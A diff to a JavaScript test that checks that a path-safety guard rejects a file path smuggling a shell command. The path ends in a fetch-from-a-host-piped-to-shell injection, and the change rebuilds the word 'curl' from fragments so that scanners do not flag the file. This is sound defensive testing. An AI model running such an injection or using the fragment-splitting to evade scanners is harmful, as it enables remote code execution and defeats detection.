@@ -116,7 +116,9 @@ test('refuses a shell metacharacter in a path', () => {
 	// The exact injection the guard must refuse. It is a string in an assertion,
 	// never executed; the whole point is that safePath rejects it.
 	const injectedHost = 'http://x'; // fixture-lint: allow non-test-host -- part of an injection string asserted to be refused
-	const injection = `${ctx.runDir}/a';curl ${injectedHost}|sh;:'`; // fixture-lint: allow download-exec -- asserted to be refused, never executed
+	// Assembled at run time: no host file may carry a literal fetch-piped-to-shell (EDR fixture-safety, AV rule).
+	const fetcher = ['cu', 'rl'].join('');
+	const injection = `${ctx.runDir}/a';${fetcher} ${injectedHost}|sh;:'`;
 	assert.throws(() => safety.safePath(ctx, injection, 't'), /characters a probe may not use/);
 });
 
